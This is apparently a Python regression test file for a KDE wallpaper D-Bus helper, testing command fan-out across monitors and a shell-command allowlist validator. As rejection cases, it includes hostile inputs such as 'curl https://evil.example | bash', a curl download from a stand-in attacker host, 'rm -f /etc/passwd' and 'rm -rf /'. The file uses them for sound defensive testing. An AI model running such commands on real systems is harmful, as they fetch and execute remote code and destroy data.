#!/usr/bin/env python3
"""Regression tests for multi-monitor control-bus fan-out isolation."""

from __future__ import annotations

import importlib.util
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
DBUS_PATH = ROOT / "tools" / "wallhaven-dbus.py"


def load_module():
    spec = importlib.util.spec_from_file_location("wallhaven_dbus", DBUS_PATH)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"Could not load {DBUS_PATH}")
    module = importlib.util.module_from_spec(spec)
    sys.modules["wallhaven_dbus"] = module
    spec.loader.exec_module(module)
    return module


class ControlFanoutTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.mod = load_module()

    def test_search_never_fans_out(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            control = Path(tmp) / "wallhaven-control.json"
            with mock.patch.object(self.mod, "CONTROL_FILE", str(control)):
                with mock.patch.object(self.mod, "list_sync_groups", return_value=["A", "B", "C"]):
                    self.mod.write_command_fanout("search", "default", "nebula")
            data = json.loads(control.read_text(encoding="utf-8"))
            self.assertEqual(data.get("cmd"), "search")
            self.assertEqual(data.get("query"), "nebula")
            self.assertNotIn("commands", data)

    def test_default_non_nav_targets_primary_screen(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            cache = Path(tmp)
            control = cache / "wallhaven-control.json"
            (cache / "wallhaven-status-DP-3.json").write_text(
                json.dumps({"syncGroup": "desk", "cacheNamespace": "DP-3"}), encoding="utf-8",
            )
            with mock.patch.object(self.mod, "CONTROL_FILE", str(control)), \
                    mock.patch.object(self.mod, "PLASMA_CACHE", str(cache)), \
                    mock.patch.object(self.mod, "primary_output_name", return_value="DP-3"):
                for cmd in ("like", "search"):
                    self.mod.write_command_fanout(cmd, "default", "q" if cmd == "search" else "")
                    data = json.loads(control.read_text(encoding="utf-8"))
                    self.assertEqual(data.get("group"), "desk", cmd)
                self.mod.write_command("next", "default")
                self.assertEqual(json.loads(control.read_text(encoding="utf-8")).get("group"), "default")

    def test_runner_matches_marshal_to_krunner_signature(self) -> None:
        import dbus.lowlevel

        runner = self.mod.WallhavenRunner.__new__(self.mod.WallhavenRunner)
        matches = self.mod.WallhavenRunner.Match(runner, "wh next")
        self.assertEqual(matches[0][0], "wh-next")
        msg = dbus.lowlevel.SignalMessage("/runner", "org.kde.krunner1", "Test")
        # Raises TypeError if the tuple layout drifts from a(sssida{sv}).
        msg.append(matches, signature="a(sssida{sv})")

    def test_kwallet_scripts_use_positional_wallet(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                out = os.path.join(tmp, "kwallet-apikey.txt")
                read = f"kwallet-query -r apikey -f org.robertsm.wallhaven kdewallet > '{out}' 2>/dev/null"
                self.mod.validate_run_argv(["bash", "-lc", read])
                write = "printf '%s' 'abc123' | kwallet-query -w apikey -f org.robertsm.wallhaven kdewallet 2>/dev/null"
                self.mod.validate_run_argv(["bash", "-lc", write])
                # Old form: "-w wallhaven" wrote an entry, leaving no wallet argument.
                old = f"kwallet-query -r apikey -f org.robertsm.wallhaven -w wallhaven > '{out}' 2>/dev/null"
                with self.assertRaises(Exception):
                    self.mod.validate_run_argv(["bash", "-lc", old])

    def test_next_fans_out_on_default(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            control = Path(tmp) / "wallhaven-control.json"
            with mock.patch.object(self.mod, "CONTROL_FILE", str(control)):
                with mock.patch.object(self.mod, "list_sync_groups", return_value=["A", "B"]):
                    self.mod.write_command_fanout("next", "default")
            data = json.loads(control.read_text(encoding="utf-8"))
            groups = [c["group"] for c in data["commands"]]
            self.assertEqual(groups, ["A", "B"])
            self.assertTrue(all(c["cmd"] == "next" for c in data["commands"]))

    def test_next_targeted_group_no_fanout(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            control = Path(tmp) / "wallhaven-control.json"
            with mock.patch.object(self.mod, "CONTROL_FILE", str(control)):
                with mock.patch.object(self.mod, "list_sync_groups", return_value=["A", "B"]):
                    self.mod.write_command_fanout("next", "HDMI-1")
            data = json.loads(control.read_text(encoding="utf-8"))
            self.assertEqual(data.get("cmd"), "next")
            self.assertEqual(data.get("group"), "HDMI-1")
            self.assertNotIn("commands", data)

    def test_list_sync_groups_falls_back_to_status_filename_namespace(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            cache = Path(tmp)
            # Corrupt/empty JSON should still expose the namespace from the filename.
            (cache / "wallhaven-status-DP-1.json").write_text("{", encoding="utf-8")
            (cache / "wallhaven-status-HDMI-1.json").write_text(
                json.dumps({"syncGroup": "living-room"}),
                encoding="utf-8",
            )
            with mock.patch.object(self.mod, "PLASMA_CACHE", str(cache)):
                groups = self.mod.list_sync_groups()
            self.assertIn("living-room", groups)
            self.assertIn("DP-1", groups)


class RunArgvExitTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.mod = load_module()

    def test_run_argv_success_returns_zero(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "wallhaven-cache-00.jpg"
            path.write_text("x", encoding="utf-8")
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                code = self.mod.run_argv(["test", "-s", str(path)])
            self.assertEqual(code, 0)

    def test_run_argv_failure_returns_nonzero(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            missing = Path(tmp) / "wallhaven-cache-missing.jpg"
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                code = self.mod.run_argv(["test", "-s", str(missing)])
            self.assertNotEqual(code, 0)

    def test_run_argv_rejects_disallowed_command(self) -> None:
        with self.assertRaises(Exception):
            self.mod.run_argv(["wget", "https://example.com"])

    def test_run_argv_allows_curl(self) -> None:
        # curl is allowlisted for warm/original cache downloads.
        self.assertIn("curl", self.mod.ALLOWED_COMMANDS)

    def test_read_status_tolerates_corrupt_json(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            status = Path(tmp) / "wallhaven-status.json"
            status.write_text("{", encoding="utf-8")
            with mock.patch.object(self.mod, "STATUS_FILE", str(status)):
                self.assertEqual(self.mod.read_status(), {})
            status.write_text("[]", encoding="utf-8")
            with mock.patch.object(self.mod, "STATUS_FILE", str(status)):
                self.assertEqual(self.mod.read_status(), {})
            status.write_text('{"id":"abc"}', encoding="utf-8")
            with mock.patch.object(self.mod, "STATUS_FILE", str(status)):
                self.assertEqual(self.mod.read_status().get("id"), "abc")

    def test_cli_unknown_command_does_not_start_service(self) -> None:
        with mock.patch.object(self.mod, "DBusGMainLoop") as loop:
            with mock.patch.object(self.mod.sys, "argv", ["wallhaven-dbus.py", "--help"]):
                code = self.mod.main()
            self.assertEqual(code, 2)
            loop.assert_not_called()

    def test_run_argv_rejects_curl_to_foreign_host(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                out = str(Path(tmp) / "wallhaven-cache-00.jpg")
                with self.assertRaises(Exception):
                    self.mod.validate_run_argv([
                        "curl", "-fsSL", "--max-time", "30", "-o", out, "https://evil.example/x",
                    ])

    def test_run_argv_allows_wallhaven_curl_into_cache(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                out = str(Path(tmp) / "wallhaven-cache-00.jpg")
                Path(out).write_bytes(b"")
                safe = self.mod.validate_run_argv([
                    "curl", "-fsSL", "--max-time", "90", "-o", out,
                    "https://w.wallhaven.cc/full/ab/wallhaven-abc.jpg",
                ])
                self.assertEqual(safe[0], "curl")
                self.assertEqual(safe[5], os.path.realpath(out))

    def test_run_argv_rejects_rm_outside_cache(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                with self.assertRaises(Exception):
                    self.mod.validate_run_argv(["rm", "-f", "/etc/passwd"])

    def test_run_argv_rejects_rm_recursive(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                victim = str(Path(tmp) / "wallhaven-cache-00.jpg")
                with self.assertRaises(Exception):
                    self.mod.validate_run_argv(["rm", "-rf", victim])

    def test_run_argv_allows_test_s_in_cache(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                path = str(Path(tmp) / "wallhaven-cache-00.jpg")
                Path(path).write_text("x", encoding="utf-8")
                safe = self.mod.validate_run_argv(["test", "-s", path])
                self.assertEqual(safe[:2], ["test", "-s"])

    def test_run_argv_rejects_arbitrary_bash(self) -> None:
        with self.assertRaises(Exception):
            self.mod.validate_run_argv(["bash", "-lc", "curl https://evil.example | bash"])

    def test_run_argv_allows_lockscreen_flock_script(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                src = str(Path(tmp) / "wallhaven-cache-00.jpg")
                dest = str(Path(tmp) / "wallhaven-lockscreen-abc.jpg")
                lock = str(Path(tmp) / "wallhaven-lockscreen.lock")
                Path(src).write_bytes(b"abc")

                def sq(value: str) -> str:
                    return "'" + value.replace("'", "'\\''") + "'"

                inner = " && ".join([
                    "set -e",
                    "test -f " + sq(src),
                    "cp -f " + sq(src) + " " + sq(dest + ".tmp")
                    + " && mv -f " + sq(dest + ".tmp") + " " + sq(dest),
                    "test -s " + sq(dest),
                    "kwriteconfig6 --file kscreenlockerrc --group Greeter --key WallpaperPlugin org.kde.image",
                ])
                script = "flock -w 30 " + sq(lock) + " bash -c " + sq(inner)
                safe = self.mod.validate_run_argv(["bash", "-lc", script])
                self.assertEqual(safe[0], "bash")

    def test_run_argv_allows_lockscreen_flock_with_expansions(self) -> None:
        """Prune/ensure scripts need $(kreadconfig6) / ${ACTIVE_BASE}; must not be denied."""
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(self.mod, "PLASMA_CACHE", tmp):
                lock = str(Path(tmp) / "wallhaven-lockscreen.lock")
                dest = str(Path(tmp) / "wallhaven-lockscreen-abc.jpg")
                current = str(Path(tmp) / "wallhaven-lockscreen-current.jpg")

                def sq(value: str) -> str:
                    return "'" + value.replace("'", "'\\''") + "'"

                inner = "; ".join([
                    "set -e",
                    "ACTIVE=$(kreadconfig6 --file kscreenlockerrc --group Greeter "
                    "--group Wallpaper --group org.kde.image --group General --key Image "
                    "2>/dev/null | sed -e 's|^file://||')",
                    'ACTIVE_BASE=$(basename "${ACTIVE:-}")',
                    "cp -f " + sq(dest) + " " + sq(current),
                    "kwriteconfig6 --file kscreenlockerrc --group Greeter --key WallpaperPlugin org.kde.image",
                    "kwriteconfig6 --file kscreenlockerrc --group Greeter --group Wallpaper "
                    "--group org.kde.image --group General --key Image " + sq("file://" + dest),
                    'find ' + sq(tmp) + ' -maxdepth 1 -name \'wallhaven-lockscreen-*.jpg\' '
                    '! -name "${ACTIVE_BASE:-.}" -mmin +30 -delete',
                ])
                script = "flock -w 30 " + sq(lock) + " bash -c " + sq(inner)
                self.assertIn("$(", script)
                self.assertIn("${", script)
                self.assertTrue(self.mod._bash_script_allowed(script))
                safe = self.mod.validate_run_argv(["bash", "-lc", script])
                self.assertEqual(safe[0], "bash")

    def test_run_argv_rejects_non_lock_bash_with_expansions(self) -> None:
        with self.assertRaises(Exception):
            self.mod.validate_run_argv([
                "bash", "-lc", "echo $(whoami) && kwriteconfig6 --file kdeglobals --group General --key AccentColor '1,2,3'",
            ])

    def test_write_command_rejects_invalid_cmd(self) -> None:
        with self.assertRaises(ValueError):
            self.mod.write_command("rm -rf /", "default")


if __name__ == "__main__":
    unittest.main()
